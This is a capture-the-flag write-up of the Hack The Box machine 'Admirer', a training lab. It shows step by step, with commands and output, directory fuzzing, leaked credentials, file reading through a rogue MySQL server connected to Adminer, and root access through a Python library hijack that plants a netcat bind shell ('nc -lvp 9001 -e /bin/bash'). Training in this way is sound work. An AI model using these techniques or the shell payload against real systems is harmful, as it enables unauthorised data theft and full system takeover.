---
title: Hackthebox Admirer Writeup
author: Vibhu Bansal
date: 2020-05-10 18:00:00 +/-TTTT
categories: [Hackthebox, Machine]
tags: [Hackthebox, Linux, Mysql remote access, Python Path hijacking]
image: [/assets/img/post/hackthebox/admirer/main.png]
---

# Information:~$

| Title         | Details       |
| -------- |:--------:|
| Name         |Admirer |
| IP     | 10.10.10.187    |
| Difficulty| Easy   |
| Points | 20 |
| OS | Linux|

# Brief:~$

Admirer is Easy rated `linux` box. indeed it was easy but there were a lto of fake credentials.Starting with nmap scan we get `robots.txt` disallowing `admin-dir`. On `fuzzing` admin-dir we get `2 files` and from one the file we get credentials for `FTP`. On doing FTP login we get some files which contain a directory `utility-scripts` and on fuzing that we get adminer.php. On exploiting adminer Database by setting a remote `sql server` on our system we get password for `waldo` user and after that we saw user waldo can run a script as `root` and we did `Python path hijacking` and got our root shell 


# Reconnaissance:~$

## Nmap Scan:~$

```bash
nmap -sC -sV 10.10.10.187
```

```bash
# Nmap 7.80 scan initiated Mon May  4 20:11:20 2020 as: nmap -sC -sV -oN nmap/initial 10.10.10.187
Nmap scan report for 10.10.10.187
Host is up (0.28s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May  4 20:12:30 2020 -- 1 IP address (1 host up) scanned in 70.66 seconds
```

We get 3 Ports `21(FTP)`, `22(SSH)`, `80(HTTP)`

Port 21 Doesn't allow Anonymous Login

```bash
 ~/htb/boxes/Admirer >> ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:vibhu): anonymous
530 Permission denied.
Login failed.
ftp> 
```

Let's See `Port 80`

![Admirer](/assets/img/post/hackthebox/admirer/1.png)

We get `/admin-dir` disallowed from `robots.txt` 

Let's Check robots.txt

![Admirer](/assets/img/post/hackthebox/admirer/2.png)

Let's Do some Fuzzing on it

```bash
~/htb/boxes/Admirer >> wfuzz -w /usr/share/wordlists/dirb/big.txt -u http://admirer.htb/admin-dir/FUZZ.FUZ2Z  -z list,txt-php -c --hc 404,403

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://admirer.htb/admin-dir/FUZZ.FUZ2Z
Total requests: 40938

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                              
===================================================================

000010395:   200        29 L     39 W     350 Ch      "contacts - txt"                                                                                     
000010885:   200        11 L     13 W     136 Ch      "credentials - txt"        
```

Let's See what these contain

### contacts.txt

```
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```
### credentials.txt

```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```
We get credentials for `FTP` Let's go 

`ftpuser:%n?4Wz}R$tTF7`

## FTP Login:~$

```bash
 ~/htb/boxes/Admirer >> ftp admirer.htb
Connected to admirer.htb.
220 (vsFTPd 3.0.3)
Name (admirer.htb:vibhu): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-x---    2 0        111          4096 Dec 03 21:21 .
drwxr-x---    2 0        111          4096 Dec 03 21:21 ..
-rw-r--r--    1 0        0            3405 Dec 02 21:24 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03 21:20 html.tar.gz
226 Directory send OK.
ftp> 
```

We get 2 files Let's save them on our system

```bash
ftp> get dump.sql 
local: dump.sql remote: dump.sql
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
226 Transfer complete.
3405 bytes received in 0.00 secs (1.2235 MB/s)
ftp> get html.tar.gz
local: html.tar.gz remote: html.tar.gz
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
226 Transfer complete.
5270987 bytes received in 9.41 secs (547.0543 kB/s)
ftp> 
```
# Enumeration:~$

Let's Take a loot at what we have

```bash
 ~/htb/boxes/Admirer >> cat dump.sql 
-- MySQL dump 10.16  Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: admirerdb
-- ------------------------------------------------------
-- Server version       10.1.41-MariaDB-0+deb9u1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `items`
--

DROP TABLE IF EXISTS `items`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `items` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `thumb_path` text NOT NULL,
  `image_path` text NOT NULL,
  `title` text NOT NULL,
  `text` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `items`
--

LOCK TABLES `items` WRITE;
/*!40000 ALTER TABLE `items` DISABLE KEYS */;
INSERT INTO `items` VALUES (1,'images/thumbs/thmb_art01.jpg','images/fulls/art01.jpg','Visual Art','A pure 
......................

-- Dump completed on 2019-12-02 20:24:15
```
Unzip the file

```bash
~/htb/boxes/Admirer/dir >> tar -xzf html.tar.gz 
~/htb/boxes/Admirer/dir >> ls
assets  html.tar.gz  images  index.php  robots.txt  utility-scripts  w4ld0s_s3cr3t_d1r
```

There were so many credentials but all are `Dead End` 

Let's see what else we have

```bash
 ~/htb/boxes/Admirer/dir/utility-scripts >> ls -lah
total 24K
drwxr-x--- 2 vibhu vibhu 4.0K Dec  2 23:20 .
drwxr-xr-x 6 vibhu vibhu 4.0K May 10 11:51 ..
-rw-r----- 1 vibhu vibhu 1.8K Dec  2 23:18 admin_tasks.php
-rw-r----- 1 vibhu vibhu  401 Dec  2 03:58 db_admin.php
-rw-r----- 1 vibhu vibhu   20 Nov 30 01:02 info.php
-rw-r----- 1 vibhu vibhu   53 Dec  2 23:10 phptest.php
 ~/htb/boxes/Admirer/dir/utility-scripts >> 
```
Let's See if we can access it through `web`

![Admirer](/assets/img/post/hackthebox/admirer/3.png)

But we can access 3 out of 4 files 

![Admirer](/assets/img/post/hackthebox/admirer/4.png)

![Admirer](/assets/img/post/hackthebox/admirer/5.png)

and info.php give some php info

Let's do some Fuzzing

```bash
 /htb/boxes/Admirer >> wfuzz -w /usr/share/wordlists/dirb/big.txt -u http://admirer.htb/utility-scripts/FUZZ.FUZ2Z  -z list,php -c --hc 404,403

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://admirer.htb/utility-scripts/FUZZ.FUZ2Z
Total requests: 20469

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                              
===================================================================

000001873:   200        51 L     235 W    4158 Ch     "adminer - php"

```
We get a login Screen 

![Admirer](/assets/img/post/hackthebox/admirer/6.png)

# Initial Foothold:~$

Here this part took me a whole while to figure out, as I tried every set of credentials I got earlier. 

But When I searched about adminer database I found [this](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool) article online

So Let's Configure our Database 

I am using `maraia-db`

The Following articles Helped me in doing that

<https://support.rackspace.com/how-to/install-mysql-server-on-the-ubuntu-operating-system/>

Let's Configure our Database

```bash
root@p3n:/home/vibhu/htb/boxes/Admirer# mysql
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 38
Server version: 10.3.22-MariaDB-1 Debian buildd-unstable

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

# Created Datbase Admirer
MariaDB [(none)]> CREATE DATABASE admirer;
Query OK, 1 row affected (0.000 sec)

# Created a Demo User

MariaDB [(none)]> INSERT INTO mysql.user (User,Host,authentication_string,ssl_cipher,x509_issuer,x509_subject) VALUES('demo','%',PASSWORD('demopassword'),'','','');Query OK, 1 row affected (0.020 sec)

#Tell Mysql to read the changes

MariaDB [(none)]> FLUSH PRIVILEGES;
Query OK, 0 rows affected (0.001 sec)

# Select Database

MariaDB [(none)]> USE admirer;
Database changed

# Grant all Permissions

MariaDB [admirer]> GRANT ALL PRIVILEGES ON *.* TO 'demo'@'%';
Query OK, 0 rows affected (0.000 sec)

# Created Table Test

MariaDB [admirer]> create table test(data VARCHAR(255));
Query OK, 0 rows affected (0.277 sec)

MariaDB [admirer]> 
```

Let's Enable remote Access

```bash
~/htb/boxes/Admirer >> sudo nano /etc/mysql/mariadb.conf.d/50-server.cnf 
```

Change the value of `Bind Address` from `127.0.0.1` to `0.0.0.0`

```
bind-address      = 0.0.0.0
```

Restart the `mysql` and we are good to go


![Admirer](/assets/img/post/hackthebox/admirer/7.png)

and we are in

Now Follow the Video from the blog [Here](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool)

![Admirer](/assets/img/post/hackthebox/admirer/8.png)

Let's Follow the video and execute the following command to write data in table test

```
load data local infile 'app/data/local.xml'
into table test
fields terminated by "/n"
```

But if we `execute` the follwing command we get a error `local.xml` doesn't exist

Let's try for `index.php`

```
load data local infile '../index.php'
into table test
fields terminated by "/n"
```

We are `successfull`

![Admirer](/assets/img/post/hackthebox/admirer/9.png)

On going through the `result` we get password for `waldo` user

![Admirer](/assets/img/post/hackthebox/admirer/10.png)

`waldo:&<h5b~yK3F#{PaPB&dA}{H>`

```bash
 ~/htb/boxes/Admirer >> ssh waldo@admirer.htb
The authenticity of host 'admirer.htb (10.10.10.187)' can't be established.
ECDSA key fingerprint is SHA256:NSIaytJ0GOq4AaLY0wPFdPsnuw/wBUt2SvaCdiFM8xI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'admirer.htb' (ECDSA) to the list of known hosts.
waldo@admirer.htb's password: 
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun May 10 12:41:02 2020 from 10.10.15.160
waldo@admirer:~$ id & whoami
[1] 5979
uid=1000(waldo) gid=1000(waldo) groups=1000(waldo),1001(admins)
waldo
[1]+  Done                    id
waldo@admirer:~$ ls
user.txt
waldo@admirer:~$ 
```
# Privilege Escalation:~$

```bash
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
waldo@admirer:~$ 
```

Let's Check admin_tasks.sh

It similar to admin_tasks.php but with some extra features

```bash
waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}



# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi


# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done

exit 0
waldo@admirer:~$ 
```

Interesting

```bash
backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
```

Let's check `backup.py`

```python
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

Before moving on Read [this](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)

**Points to Note**

+ We know we can change PYTHONPATH
+ admin_tasks.sh can be runned as root
+ admin_tasks.sh is running backup.py 
+ So backup.py will also be running a root
+ backup.py is importing shutil module
+ Therefore if we change shutil.py to our custom shutil.py which contain our shell we can gain shell as root

Let's move forward 

```bash
waldo@admirer:/opt/scripts$ python -c 'import sys; print "\n".join(sys.path)'

/usr/lib/python2.7
/usr/lib/python2.7/plat-x86_64-linux-gnu
/usr/lib/python2.7/lib-tk
/usr/lib/python2.7/lib-old
/usr/lib/python2.7/lib-dynload
/usr/local/lib/python2.7/dist-packages
/usr/lib/python2.7/dist-packages
```

Create a directory in `temp` folder

```bash
waldo@admirer:/tmp$ ls
temp  vmware-root
waldo@admirer:/tmp$ ls temp/
shutil.py
waldo@admirer:/tmp$ cat temp/shutil.py 

import os
os.system("nc -lvp 9001 -e /bin/bash")
waldo@admirer:/tmp$ 
```
Let's run the `script` 

```bash
waldo@admirer:/tmp/temp$ sudo -E PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh 6
Running backup script in the background, it might take a while...
waldo@admirer:/tmp/temp$ listening on [any] 9001 ...
```
and now try `nc` to port 9001 on machine and we are `root`

```bash
 ~/htb/boxes/Admirer >> rlwrap nc 10.10.10.187 9001
id
uid=0(root) gid=0(root) groups=0(root)
python -c 'import pty;pty.spawn("/bin/bash")'
root@admirer:/tmp/temp# cd
cd \root
root@admirer:/root# whoami && id && wc -l root.txt
whoami && id && wc -l root.txt
root
uid=0(root) gid=0(root) groups=0(root)
1 root.txt
root@admirer:/root# 
```
# Resources:~$

| Topic | Link|
|-------|-----|
| Adminer Database Exploit| [Here](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool)|
| Mysql Server | [Here](https://support.rackspace.com/how-to/install-mysql-server-on-the-ubuntu-operating-system/)|
| Python Path Hijacking | [Here](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)|



With this, we come to the end of the story of how I owned Admirer 😃

Thank you for reading !!!

*We would love to hear about any suggestions or queries.*

